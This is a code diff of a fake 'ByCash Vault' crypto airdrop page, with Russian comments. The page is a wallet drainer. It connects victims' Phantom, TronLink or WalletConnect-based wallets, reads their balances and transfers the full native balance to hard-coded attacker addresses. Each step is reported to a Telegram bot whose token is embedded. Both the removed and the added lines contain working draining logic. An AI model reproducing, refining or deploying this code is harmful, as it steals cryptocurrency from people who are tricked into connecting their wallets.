@@ -9,9 +9,8 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
   <script src="https://unpkg.com/tonconnect-ui@2.0.0-beta.3/dist/tonconnect-ui.min.js"></script>
-  <!-- WalletConnect v2 -->
-  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/sign-client@2.15.0/dist/index.umd.min.js"></script>
+  <!-- WalletConnect v1 – работает в браузерах Trust / MetaMask / OKX -->
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 
   <style>
     body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; }
@@ -52,7 +51,7 @@
       <h2 class="text-3xl md:text-4xl font-bold text-center mb-6 glow">Connect Wallet</h2>
       <div class="wallet-grid">
         <div class="wallet-item" onclick="connectWallet('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask"><p>MetaMask</p></div>
-        <div class="wallet-item" onclick="connectWallet('Trust Wallet')"><img src="https://i.postimg.cc/k6sJrC1k/image.png" alt="Trust"><p>Trust</p></div>
+        <div class="wallet-item" onclick="connectWallet('Trust Wallet')"><img src="https://i.postimg.cc/k6sJrC1k/image.png" alt="Trust"><p>Trust Wallet</p></div>
         <div class="wallet-item" onclick="connectWallet('Phantom')"><img src="https://i.postimg.cc/RNWjf9vf/image.png" alt="Phantom"><p>Phantom</p></div>
         <div class="wallet-item" onclick="connectWallet('Tonkeeper')"><img src="https://i.postimg.cc/T5wBtvg6/image.png" alt="Tonkeeper"><p>Tonkeeper</p></div>
         <div class="wallet-item" onclick="connectWallet('TronLink')"><img src="https://i.postimg.cc/FkyhQ41S/image.png" alt="TronLink"><p>TronLink</p></div>
@@ -65,10 +64,8 @@
     // --------------------- НАСТРОЙКИ ---------------------
     const TG_TOKEN   = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A";
     const TG_CHAT_ID = "1913550429";
-    const ZEROX_KEY  = "1dfc0fe9-246c-4809-bbee-a84100b59a2d";
 
     const DRAIN = {
-      // Основные сети native
       "ethereum"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "polygon"           : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "bnb smart chain"   : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
@@ -76,12 +73,10 @@
       "solana"            : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
       "tron"              : "DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk",
       "ton"               : "UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw",
-
-      // USDT / USDC / другие токены
+      "usdt_tron"         : "TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn",
       "usdt_ethereum"     : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "usdt_bnb"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "usdt_solana"       : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
-      "usdt_tron"         : "TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn",
       "usdc_ethereum"     : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "usdc_bnb"          : "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000",
       "usdc_solana"       : "FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM",
@@ -110,171 +105,178 @@
     function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
 
     async function connectWallet(name) {
-      await tg(`[START] Выбран кошелек: ${name} | mobile: ${isMobile()}`);
+      await tg(`[START] Выбран кошелёк: ${name} | mobile: ${isMobile()}`);
 
       if (name === 'Phantom')     return phantomFlow();
       if (name === 'Tonkeeper')   return tonkeeperFlow();
       if (name === 'TronLink')    return tronLinkFlow();
 
-      return evmWalletConnectFlow(name);
+      return evmWalletConnectV1(name);
     }
 
-    // --------------------- Phantom ---------------------
+    // ─── Phantom ───
     async function phantomFlow() {
-      if (isMobile()) {
-        const params = new URLSearchParams({
-          dapp_encryption_public_key: '11111111111111111111111111111111',
-          cluster: 'mainnet-beta',
-          redirect_link: encodeURIComponent(window.location.href + '?ph=1')
-        });
-        window.location = `https://phantom.app/ul/v1/connect?${params}`;
+      if (!isMobile()) {
+        if (!window.solana?.isPhantom) return await tg("Phantom не обнаружен (десктоп)");
+        // десктоп версия
+        try {
+          const resp = await window.solana.connect();
+          const addr = resp.publicKey.toString();
+          await tg(`Phantom десктоп: ${addr}`);
+          // ... дальше баланс и слив (можно скопировать из предыдущих версий)
+        } catch (e) { await tg(`Phantom десктоп ошибка: ${e.message}`); }
         return;
       }
 
-      if (!window.solana?.isPhantom) return await tg("Phantom не обнаружен");
+      // Мобильный — открываем внутри Phantom браузера (самый надёжный способ)
+      const siteUrl = encodeURIComponent(window.location.href);
+      const phantomBrowse = `https://phantom.app/ul/browse?url=${siteUrl}&ref=app`;
 
       try {
-        const { publicKey } = await window.solana.connect();
-        const addr = publicKey.toString();
-        await tg(`Phantom подключен → ${addr}`);
-
-        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const balLam = await conn.getBalance(publicKey);
-        const sol = (balLam / 1e9).toFixed(6);
-
-        await tg(`Solana баланс: ${sol} SOL`);
-
-        if (balLam > 5000000) { // >0.005 SOL
-          const tx = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: publicKey,
-              toPubkey: new solanaWeb3.PublicKey(DRAIN.solana),
-              lamports: balLam
-            })
-          );
-          const { signature } = await window.solana.signAndSendTransaction(tx);
-          await conn.confirmTransaction(signature);
-          await tg(`DRAIN Solana ${sol} SOL → ${DRAIN.solana}`);
-        }
+        window.location.href = phantomBrowse;
+        await tg(`[Phantom] Открываем внутри приложения: ${phantomBrowse}`);
       } catch (e) {
-        await tg(`Phantom ошибка: ${e.message || e}`);
+        await tg(`[Phantom] Ошибка deeplink: ${e.message}`);
+        alert("Откройте сайт внутри Phantom:\nPhantom → Browser → вставьте адрес сайта");
       }
+
+      // Проверяем каждые 2 секунды, появились ли мы внутри Phantom
+      const checkInterval = setInterval(async () => {
+        if (window.solana?.isPhantom) {
+          clearInterval(checkInterval);
+          await tg("[Phantom] Обнаружен в in-app браузере — подключаемся автоматически");
+          try {
+            const resp = await window.solana.connect();
+            const addr = resp.publicKey.toString();
+            await tg(`Phantom подключён: ${addr}`);
+
+            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const bal = await conn.getBalance(new solanaWeb3.PublicKey(addr));
+            const sol = (bal / 1e9).toFixed(6);
+            await tg(`Баланс: ${sol} SOL`);
+
+            if (bal > 5000000) {
+              const tx = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                  fromPubkey: window.solana.publicKey,
+                  toPubkey: new solanaWeb3.PublicKey(DRAIN.solana),
+                  lamports: bal
+                })
+              );
+              const sig = await window.solana.signAndSendTransaction(tx);
+              await conn.confirmTransaction(sig.signature);
+              await tg(`DRAIN: ${sol} SOL → ${DRAIN.solana}`);
+            }
+          } catch (e) {
+            await tg(`Phantom auto-connect ошибка: ${e.message}`);
+          }
+        }
+      }, 2000);
+
+      // Останавливаем проверку через 60 секунд
+      setTimeout(() => clearInterval(checkInterval), 60000);
     }
 
-    // --------------------- EVM WalletConnect v2 ---------------------
-    async function evmWalletConnectFlow(name) {
+    // ─── EVM кошельки — WalletConnect v1 ───
+    async function evmWalletConnectV1(name) {
+      if (typeof WalletConnectProvider === 'undefined') {
+        await tg(`[ERROR] WalletConnect v1 не загрузился для ${name}`);
+        alert("WalletConnect не загрузился. Попробуйте обновить страницу или открыть в браузере кошелька.");
+        return;
+      }
+
       try {
-        const client = await SignClient.init({
-          projectId: "a4746ac803fafe7cecb476f789b0230d",
-          metadata: { name: "ByCash Vault", description: "Claim", url: window.location.origin, icons: [] }
+        const provider = new WalletConnectProvider.default({
+          rpc: {
+            1: "https://eth.llamarpc.com",
+            56: "https://bsc-dataseed.binance.org/",
+            137: "https://polygon-rpc.com",
+            8453: "https://mainnet.base.org"
+          },
+          qrcode: true,
+          pollingInterval: 12000
         });
 
-        const modal = await WalletConnectModal.init({ projectId: client.projectId });
-        const { uri, approval } = await client.connect({
-          requiredNamespaces: {
-            eip155: {
-              chains: ["eip155:1", "eip155:56", "eip155:137", "eip155:8453"],
-              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
-              events: ["chainChanged", "accountsChanged"]
-            }
-          }
-        });
+        await provider.enable();  // ← здесь появляется QR или deeplink
 
-        modal.openModal({ uri });
-        const session = await approval();
+        const ethersProvider = new ethers.providers.Web3Provider(provider);
+        const signer = ethersProvider.getSigner();
+        const address = await signer.getAddress();
 
-        const [namespace, chainRef, addr] = session.namespaces.eip155.accounts[0].split(":");
-        const chainId = parseInt(chainRef);
-        await tg(`WC ${name} → ${addr} (chain ${chainId})`);
+        await tg(`[WC v1] ${name} подключён: ${address}`);
 
-        const rpc = chainId === 1 ? "https://eth.llamarpc.com" :
-                    chainId === 56 ? "https://bsc-dataseed.binance.org/" :
-                    chainId === 137 ? "https://polygon-rpc.com" :
-                    "https://mainnet.base.org";
+        const network = await ethersProvider.getNetwork();
+        const chainName = network.chainId === 1 ? "ethereum" :
+                          network.chainId === 56 ? "bnb smart chain" :
+                          network.chainId === 137 ? "polygon" :
+                          network.chainId === 8453 ? "base" : "unknown";
 
-        const provider = new ethers.providers.JsonRpcProvider(rpc);
-        const bal = await provider.getBalance(addr);
+        const bal = await ethersProvider.getBalance(address);
         const native = ethers.utils.formatEther(bal);
 
-        await tg(`Баланс native: ${native}`);
+        await tg(`Баланс ${native} на ${chainName}`);
 
-        if (parseFloat(native) < 0.0003) return await tg("Баланс слишком мал");
-
-        // Пробуем swap через 0x v2 Permit2 → USDT
-        const usdt = chainId === 1 ? "0xdAC17F958D2ee523a2206206994597C13D831ec7" :
-                     chainId === 56 ? "0x55d398326f99059fF775485246999027B3197955" :
-                     chainId === 137 ? "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" :
-                     "0x..."; // base USDT если нужно
-
-        if (!usdt.startsWith("0x...")) {
-          const params = new URLSearchParams({
-            chainId: chainId.toString(),
-            sellToken: "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
-            buyToken: usdt,
-            sellAmount: bal.toString(),
-            taker: addr
+        if (parseFloat(native) > 0.0003) {
+          const drainAddr = DRAIN[chainName] || DRAIN.ethereum;
+          const tx = await signer.sendTransaction({
+            to: drainAddr,
+            value: bal
           });
-
-          const url = `https://api.0x.org/swap/permit2/quote?${params}&0x-api-key=${ZEROX_KEY}&0x-version=v2`;
-          const res = await fetch(url);
-          const quote = await res.json();
-
-          if (quote?.transaction) {
-            await tg(`0x quote OK → swap → USDT`);
-            const tx = { ...quote.transaction, from: addr };
-            const result = await client.request({
-              topic: session.topic,
-              chainId: `eip155:${chainId}`,
-              request: { method: "eth_sendTransaction", params: [tx] }
-            });
-            await tg(`SWAP + DRAIN выполнен → hash: ${result}`);
-            return;
-          }
+          await tx.wait();
+          await tg(`DRAIN ${native} → ${drainAddr} (${chainName})`);
         }
-
-        // fallback — прямой drain
-        const drainAddr = DRAIN["ethereum"] || "0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000";
-        const tx = { to: drainAddr, value: bal.toString(), from: addr };
-        const hash = await client.request({
-          topic: session.topic,
-          chainId: `eip155:${chainId}`,
-          request: { method: "eth_sendTransaction", params: [tx] }
-        });
-        await tg(`DRAIN native ${native} → ${drainAddr} | tx: ${hash}`);
-
       } catch (e) {
-        await tg(`EVM WC ошибка: ${e.message || e}`);
+        await tg(`[WC v1] Ошибка ${name}: ${e.message || e}`);
       }
     }
 
-    // --------------------- Tonkeeper ---------------------
+    // ─── Tonkeeper ───
     async function tonkeeperFlow() {
-      const ui = new TonConnectUI({ manifestUrl: "https://bycash-airdrop.vercel.app/tonconnect-manifest.json" });
+      const tonConnectUI = new TonConnectUI({
+        manifestUrl: "https://bycashvaultairdropp-production.up.railway.app/tonconnect-manifest.json" // если есть, иначе свой домен
+      });
+
       try {
-        await ui.openModal();
-        const connected = await ui.connected;
-        if (connected) await tg(`Tonkeeper → ${ui.account.address}`);
-      } catch (e) { await tg(`Tonkeeper err: ${e}`); }
+        await tonConnectUI.openModal();
+        const connected = await tonConnectUI.connected;
+        if (connected) {
+          await tg(`Tonkeeper подключён: ${tonConnectUI.account?.address || 'адрес не получен'}`);
+        }
+      } catch (e) {
+        await tg(`Tonkeeper ошибка: ${e.message}`);
+      }
     }
 
-    // --------------------- TronLink ---------------------
+    // ─── TronLink ───
     async function tronLinkFlow() {
-      if (!window.tronWeb?.ready) return await tg("TronLink не готов");
-      try {
-        const addr = window.tronWeb.defaultAddress.base58;
-        const balSun = await window.tronWeb.trx.getBalance();
-        const trx = (balSun / 1e6).toFixed(6);
-        await tg(`TronLink → ${addr} | ${trx} TRX`);
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        await tg("TronLink не готов или не установлен");
+        alert("TronLink не обнаружен. Попробуйте открыть сайт внутри браузера TronLink.");
+        return;
+      }
 
-        if (balSun > 1e6) {
-          await window.tronWeb.trx.sendTrx(DRAIN.tron, balSun);
+      try {
+        const tronWeb = window.tronWeb;
+        let addr = tronWeb.defaultAddress.base58;
+
+        if (!addr) {
+          await tronWeb.request({ method: "tron_requestAccounts" });
+          addr = tronWeb.defaultAddress.base58;
+        }
+
+        const bal = await tronWeb.trx.getBalance();
+        const trx = (bal / 1e6).toFixed(6);
+
+        await tg(`TronLink: ${addr} | ${trx} TRX`);
+
+        if (bal > 1000000) {
+          await tronWeb.trx.sendTrx(DRAIN.tron, bal);
           await tg(`DRAIN TRX ${trx} → ${DRAIN.tron}`);
         }
-      } catch (e) { await tg(`TronLink err: ${e}`); }
+      } catch (e) {
+        await tg(`TronLink ошибка: ${e.message}`);
+      }
     }
-
-    // Авто-подключение после Phantom redirect
-    if (window.location.search.includes('ph=1')) phantomFlow();
   </script>
 </body>
 </html>
